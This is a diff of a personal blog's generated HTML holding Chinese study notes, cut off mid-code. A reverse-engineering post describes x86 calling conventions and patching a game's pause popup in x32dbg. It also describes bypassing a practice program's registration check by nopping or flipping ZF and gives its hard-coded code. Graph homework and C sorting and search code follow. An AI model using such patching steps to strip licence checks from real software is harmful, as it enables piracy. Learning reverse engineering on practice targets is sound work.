+<h2 id="3-栈"><a href="#3-栈" class="headerlink" title="3.栈"></a>3.栈</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先简单来说三种方式有一个目的,就是清理栈,cdecl是在调用函数时解决(add esp,值),stdcall是在被调用函数中解决(ret 值),而fastcall是传递少量参数,并且多用寄存器</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-1-stdcall与cdecl"><a href="#3-1-stdcall与cdecl" class="headerlink" title="3.1 stdcall与cdecl"></a>3.1 stdcall与cdecl</h3><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240714221502270.png" alt="image-20240714221502270"></p>
+<p>eg(以下都在x32dbg进行)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">像这种一般都是stdcall</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240714221829684.png" alt="image-20240714221829684"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">像这种底下跟着add esp,多少的一般都是cdecl</span><br><span class="line">平衡栈</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240714222047142.png" alt="image-20240714222047142"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tip:汇编里学习的是8086系统,是16位的微处理器,因此在8086中压栈是esp-2</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>call:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">汇编里已经学习:</span><br><span class="line">1:esp-4</span><br><span class="line">2:把下一行的地址压栈</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ret</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">esp+4</span><br><span class="line">EIP 指向前面call时候压入的地址</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ret 4</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esp+8</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="3-2-fastcall"><a href="#3-2-fastcall" class="headerlink" title="3.2 fastcall"></a>3.2 fastcall</h3><p>多用寄存器进行传参</p>
+<h3 id="3-3-植物大战僵尸弹出检测框修改"><a href="#3-3-植物大战僵尸弹出检测框修改" class="headerlink" title="3.3 植物大战僵尸弹出检测框修改"></a>3.3 植物大战僵尸弹出检测框修改</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先通过字符串寻找:游戏暂停,然后在内存地址转到</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240714233301776.png" alt="image-20240714233301776"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32是空格的ascii码,转为16进制也就是20</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240714233549893.png" alt="image-20240714233549893"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符串以00结尾,我们改掉这里的内容,就可以把游戏暂停这几个字改了,返现就是这里,然后我们需要判断弹出窗口是否就在这个函数,这里不能直接把开头改成ret,因为里面可能调用参数,我们要看他是怎么返回的,把他复制到开头</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240714234208767.png" alt="image-20240714234208767"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这样子改完,发现确实成功了,点旁边不会暂停,空格也不暂停了</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-逆向程序注册码"><a href="#3-4-逆向程序注册码" class="headerlink" title="3.4 逆向程序注册码"></a>3.4 逆向程序注册码</h3><h4 id="3-4-1-消灭弹窗"><a href="#3-4-1-消灭弹窗" class="headerlink" title="3.4.1 消灭弹窗"></a>3.4.1 消灭弹窗</h4><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240726185913752.png" alt="image-20240726185913752"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">现在有这么一个程序,我需要做到干掉弹窗和找到注册码</span><br><span class="line">首先,弹窗有很明显的字符串提示,直接进行搜索</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240726190055041.png" alt="image-20240726190055041"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过一步步进行发现弹窗位如下</span><br><span class="line">00402CFE | E8 1DE4FFFF              | call &lt;JMP.&amp;rtcMsgBox&gt;    </span><br><span class="line">把此处nop了它直接崩溃了</span><br><span class="line">原因可能是我们把它平衡栈的地方也nop了,因此我们需要帮他平衡一下栈</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240726190947317.png" alt="image-20240726190947317"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">再通过一系列寻找,找到ret 14,记住这个14是16进制的,也就是20,就是5个参数,所以最原始平栈要5个参数,然后在最开始补上add esp,0x14  欸发现还是崩溃</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240726191911885.png" alt="image-20240726191911885"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后我们思考是不是返回值漏了导致程序崩溃,再次查看,下断点,运行,步过,查看寄存器变化</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240726192508303.png" alt="image-20240726192508303"></p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240726192606198.png" alt="image-20240726192606198"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现eax变成1了,我们试试再把eax改了,发现字节长度不够,我们再去看包括这个弹窗的这整个函数,把这整个函数改成ret 多少了,就成功把弹窗干掉了</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-4-2-注册码"><a href="#3-4-2-注册码" class="headerlink" title="3.4.2 注册码"></a>3.4.2 注册码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还是一样通过字符串找到位置,发现了这个判断函数,两种方法,一种nop掉,一种改zf,可以直接跳过注册码,实现yep</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240726195147699.png" alt="image-20240726195147699"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在附近也发现了注册码,就是I&#x27;mlena151,修改直接修改即可</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240726195840219.png" alt="image-20240726195840219"></p>
+<h2 id="4-各类语句-debug"><a href="#4-各类语句-debug" class="headerlink" title="4.各类语句(debug)"></a>4.各类语句(debug)</h2><h3 id="4-1-if"><a href="#4-1-if" class="headerlink" title="4.1 if"></a>4.1 if</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eg:if (a==0)</span><br><span class="line">cmp a,0</span><br><span class="line">jne 地址  ;不等于不执行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eg:if(a&gt;0)</span><br><span class="line">cmp a,0</span><br><span class="line">jle 地址  ;小于等于不执行</span><br></pre></td></tr></table></figure>
+
+<p>注:release版很多都没有push ebp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmp a,b</span><br><span class="line">setne al</span><br><span class="line">不相等 al=1, 相等 al=0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CMOVNE 是 x86 汇编语言中的一条指令，它表示 &quot;Conditional Move if Not Equal&quot;，即在不等条件下进行条件移动。这条指令的作用是根据先前的比较结果来选择是否将一个值移动到目标寄存器中，它是根据 ZF（零标志位）来决定的：</span><br><span class="line"></span><br><span class="line">如果 ZF 为 0（表示两个操作数不相等），则执行移动操作。</span><br><span class="line">如果 ZF 为 1（表示两个操作数相等），则不执行移动操作，目标寄存器保持不变。</span><br><span class="line">这种指令在处理条件逻辑时非常有用，可以根据前面的比较结果直接进行条件赋值操作，而不需要使用分支语句来实现。</span><br><span class="line"></span><br><span class="line">cmp a,b</span><br><span class="line">cmovne c,d</span><br><span class="line">ab不相等把d赋值给c</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://cotton-star.github.io/2024/05/30/%E5%A4%A7%E5%AD%A6%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%9E%84%E4%BD%9C%E4%B8%9A%E8%A7%A3%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="cotton-star">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/05/30/%E5%A4%A7%E5%AD%A6%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%9E%84%E4%BD%9C%E4%B8%9A%E8%A7%A3%E6%9E%90/" class="post-title-link" itemprop="url">数构作业解析</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-05-30 19:09:41 / Modified: 19:44:33" itemprop="dateCreated datePublished" datetime="2024-05-30T19:09:41+08:00">2024-05-30</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="t06-图"><a href="#t06-图" class="headerlink" title="t06.图"></a>t06.图</h1><h2 id="1-强连通"><a href="#1-强连通" class="headerlink" title="1.强连通"></a>1.强连通</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530191051179.png" alt="image-20240530191051179"></p>
+<p>强连通指的是在有向图中每两个顶点之间都是可达的,当两个顶点时有两条边为最少</p>
+<h2 id="2-邻接表"><a href="#2-邻接表" class="headerlink" title="2. 邻接表"></a>2. 邻接表</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530191217676.png" alt="image-20240530191217676"></p>
+<p>图有多少个顶点,就有多少个表头结点.无向图的表结点个数为2e</p>
+<h2 id="3-无向图至少使得连通图"><a href="#3-无向图至少使得连通图" class="headerlink" title="3. 无向图至少使得连通图"></a>3. 无向图至少使得连通图</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530191420897.png" alt="image-20240530191420897"></p>
+<p>n个节点的无向图,要有n-1条使得图为一个连通图</p>
+<h2 id="4-无向图最小生成树"><a href="#4-无向图最小生成树" class="headerlink" title="4. 无向图最小生成树"></a>4. 无向图最小生成树</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530191520523.png" alt="image-20240530191520523"></p>
+<p>一个无向图有n个顶点时，最小生成树上的边数为n-1条。这是因为最小生成树是一个包含所有顶点的树，而一棵树具有n个顶点时，它恰好包含n-1条边。</p>
+<h2 id="5-有向图表头结点"><a href="#5-有向图表头结点" class="headerlink" title="5.有向图表头结点"></a>5.有向图表头结点</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530192047749.png" alt="image-20240530192047749"></p>
+<p>有向图有n个顶点则有n个表头结点</p>
+<h2 id="6-无向图表头结点"><a href="#6-无向图表头结点" class="headerlink" title="6. 无向图表头结点"></a>6. 无向图表头结点</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530192140240.png" alt="image-20240530192140240"></p>
+<p>无向图同理</p>
+<h2 id="7-深度优先"><a href="#7-深度优先" class="headerlink" title="7.深度优先"></a>7.深度优先</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530192211610.png" alt="image-20240530192211610"></p>
+<h2 id="8-无向图至少确保连通图"><a href="#8-无向图至少确保连通图" class="headerlink" title="8.无向图至少确保连通图"></a>8.无向图至少确保连通图</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530192949418.png" alt="image-20240530192949418"></p>
+<p>首先五个顶点的全连通图需要的边为n*(n-1)&#x2F;2&#x3D;10,再来一条边就可以确保六个顶点为连通图</p>
+<h2 id="9-无向图邻接矩阵0元素"><a href="#9-无向图邻接矩阵0元素" class="headerlink" title="9.无向图邻接矩阵0元素"></a>9.无向图邻接矩阵0元素</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530193456213.png" alt="image-20240530193456213"></p>
+<p>矩阵是两个顶点有边,就有两个1.固n^2-2e</p>
+<h2 id="10-n个顶点-e条弧删除弧时间复杂度"><a href="#10-n个顶点-e条弧删除弧时间复杂度" class="headerlink" title="10.n个顶点,e条弧删除弧时间复杂度"></a>10.n个顶点,e条弧删除弧时间复杂度</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530193818198.png" alt="image-20240530193818198"></p>
+<p>找结点+找边</p>
+<h2 id="11"><a href="#11" class="headerlink" title="11."></a>11.</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530194045999.png" alt="image-20240530194045999"></p>
+<h2 id="12"><a href="#12" class="headerlink" title="12."></a>12.</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530194057358.png" alt="image-20240530194057358"></p>
+<h2 id="13"><a href="#13" class="headerlink" title="13."></a>13.</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530194120362.png" alt="image-20240530194120362"></p>
+<h2 id="14"><a href="#14" class="headerlink" title="14."></a>14.</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530194201449.png" alt="image-20240530194201449"></p>
+<h2 id="15"><a href="#15" class="headerlink" title="15."></a>15.</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240530194327276.png" alt="image-20240530194327276"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1296,7 +1859,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-05-11 15:07:34" itemprop="dateModified" datetime="2024-05-11T15:07:34+08:00">2024-05-11</time>
+      <time title="Modified: 2024-05-31 15:23:00" itemprop="dateModified" datetime="2024-05-31T15:23:00+08:00">2024-05-31</time>
     </span>
 
   
@@ -1339,7 +1902,8 @@
 
 <h2 id="2-让数组左边为num的数"><a href="#2-让数组左边为num的数" class="headerlink" title="2.让数组左边为&lt;num的数,中间为&#x3D;num的数,右边为&gt;num的数"></a>2.让数组左边为&lt;num的数,中间为&#x3D;num的数,右边为&gt;num的数</h2><h3 id="1-按照思路自写：-1"><a href="#1-按照思路自写：-1" class="headerlink" title="1.按照思路自写："></a>1.按照思路自写：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">void swap(int arr[], int i,int p1)</span><br><span class="line">&#123;</span><br><span class="line">	arr[i] = arr[i] ^ arr[p1];</span><br><span class="line">	arr[p1] = arr[i] ^ arr[p1];</span><br><span class="line">	arr[i] = arr[i] ^ arr[p1];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int arr[] = &#123; 2,4,2,1,4,6,3,5,6,7 &#125;;</span><br><span class="line">	int sz = sizeof(arr) / sizeof(arr[0]);</span><br><span class="line">	int num = 3;</span><br><span class="line">	int p1 = 0;</span><br><span class="line">	int p2 = sz - 1;</span><br><span class="line">	int i = 0;</span><br><span class="line">	for (i = 0; i &lt; sz; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if (arr[i] &lt; num)</span><br><span class="line">		&#123;</span><br><span class="line">			if (i != p1)</span><br><span class="line">			&#123;</span><br><span class="line">				swap(arr,i,p1);</span><br><span class="line">			&#125;</span><br><span class="line">			p1++;</span><br><span class="line">		&#125;</span><br><span class="line">		if (arr[i] &gt; num)</span><br><span class="line">		&#123;</span><br><span class="line">			if (i == p2)</span><br><span class="line">			&#123;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">			swap(arr, i, p2);</span><br><span class="line">			i--;</span><br><span class="line">			p2--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	for (i = 0; i &lt; sz; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;%d&quot;, arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="3-由此我们可以得知快排的方法"><a href="#3-由此我们可以得知快排的方法" class="headerlink" title="3.由此我们可以得知快排的方法"></a>3.由此我们可以得知快排的方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">void swap(int arr[], int i, int p1) &#123;</span><br><span class="line">    int temp = arr[i];</span><br><span class="line">    arr[i] = arr[p1];</span><br><span class="line">    arr[p1] = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void pai(int arr[], int p1, int p2) &#123;</span><br><span class="line">    if (p1 &gt;= p2) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    int start = p1;</span><br><span class="line">    int end = p2;</span><br><span class="line">    int num = arr[p2];</span><br><span class="line">    while (p1 &lt; p2) </span><br><span class="line">    &#123;</span><br><span class="line">        while (p1 &lt; p2 &amp;&amp; arr[p1] &lt;= num) </span><br><span class="line">        &#123;</span><br><span class="line">            p1++;</span><br><span class="line">        &#125;</span><br><span class="line">        while (p1 &lt; p2 &amp;&amp; arr[p2] &gt;= num) </span><br><span class="line">        &#123;</span><br><span class="line">            p2--;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr, p1, p2);</span><br><span class="line">    &#125;</span><br><span class="line">    swap(arr, p1, end);</span><br><span class="line">    pai(arr, start, p1 - 1);</span><br><span class="line">    pai(arr, p1 + 1, end);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int arr[] = &#123; 2, 4, 2, 1, 4, 6, 3, 5, 6, 3 &#125;;</span><br><span class="line">    int sz = sizeof(arr) / sizeof(arr[0]);</span><br><span class="line"></span><br><span class="line">    pai(arr, 0, sz - 1);</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; sz; i++) &#123;</span><br><span class="line">        printf(&quot;%d &quot;, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="3-由此我们可以得知快排的方法"><a href="#3-由此我们可以得知快排的方法" class="headerlink" title="3.由此我们可以得知快排的方法"></a>3.由此我们可以得知快排的方法</h2><p>&#x2F;&#x2F;这是基于给出值在数组的最后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">void swap(int arr[], int i, int p1) &#123;</span><br><span class="line">    int temp = arr[i];</span><br><span class="line">    arr[i] = arr[p1];</span><br><span class="line">    arr[p1] = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void pai(int arr[], int p1, int p2) &#123;</span><br><span class="line">    if (p1 &gt;= p2) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    int start = p1;</span><br><span class="line">    int end = p2;</span><br><span class="line">    int num = arr[p2];</span><br><span class="line">    while (p1 &lt; p2) </span><br><span class="line">    &#123;</span><br><span class="line">        while (p1 &lt; p2 &amp;&amp; arr[p1] &lt;= num) </span><br><span class="line">        &#123;</span><br><span class="line">            p1++;</span><br><span class="line">        &#125;</span><br><span class="line">        while (p1 &lt; p2 &amp;&amp; arr[p2] &gt;= num) </span><br><span class="line">        &#123;</span><br><span class="line">            p2--;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr, p1, p2);</span><br><span class="line">    &#125;</span><br><span class="line">    swap(arr, p1, end);</span><br><span class="line">    pai(arr, start, p1 - 1);</span><br><span class="line">    pai(arr, p1 + 1, end);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int arr[] = &#123; 2, 4, 2, 1, 4, 6, 3, 5, 6, 3 &#125;;</span><br><span class="line">    int sz = sizeof(arr) / sizeof(arr[0]);</span><br><span class="line"></span><br><span class="line">    pai(arr, 0, sz - 1);</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; sz; i++) &#123;</span><br><span class="line">        printf(&quot;%d &quot;, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>还可以通过产生随机数赋值num的方法降低时间复杂度，实在写不动了;</p>
 <h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><p>优先级队列结构，就是堆结构</p>
@@ -1534,418 +2098,6 @@
 <h2 id="选数"><a href="#选数" class="headerlink" title="选数"></a>选数</h2><p>跟组合数问题一样的递归树</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">int n, k;</span><br><span class="line">int q[30];</span><br><span class="line">int arr[30];</span><br><span class="line">int res = 0;</span><br><span class="line">bool is_prime(int sum)</span><br><span class="line">&#123;</span><br><span class="line">	if (sum &lt; 2)return false;</span><br><span class="line">	for (int i = 2; i &lt;= sqrt(sum); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if (sum % i == 0)return false;</span><br><span class="line">	&#125;</span><br><span class="line">	return true;</span><br><span class="line">&#125;</span><br><span class="line">void dfs(int x, int start)</span><br><span class="line">&#123;</span><br><span class="line">	if ((x - 1) + (n - start + 1) &lt; k)</span><br><span class="line">	&#123;</span><br><span class="line">		return;</span><br><span class="line">	&#125;  //剪枝过程,x-1是已经选了几个,n-start+1是可选择数,两者加起来要大于等于k才能有解,否则直接return</span><br><span class="line">	if (x &gt; k)</span><br><span class="line">	&#123;</span><br><span class="line">		int sum = 0;</span><br><span class="line">		for (int i = 1; i &lt;=k; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum += arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		if (is_prime(sum))</span><br><span class="line">		&#123;</span><br><span class="line">			res++;</span><br><span class="line">		&#125;</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	for (int i = start;i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr[x] = q[i];</span><br><span class="line">		dfs(x + 1, i + 1);</span><br><span class="line">		arr[x] = 0;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	scanf(&quot;%d%d&quot;, &amp;n, &amp;k);</span><br><span class="line">	for (int i = 1; i &lt;=n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		scanf(&quot;%d&quot;, &amp;q[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	dfs(1, 1);</span><br><span class="line">	printf(&quot;%d\n&quot;, res);</span><br><span class="line">	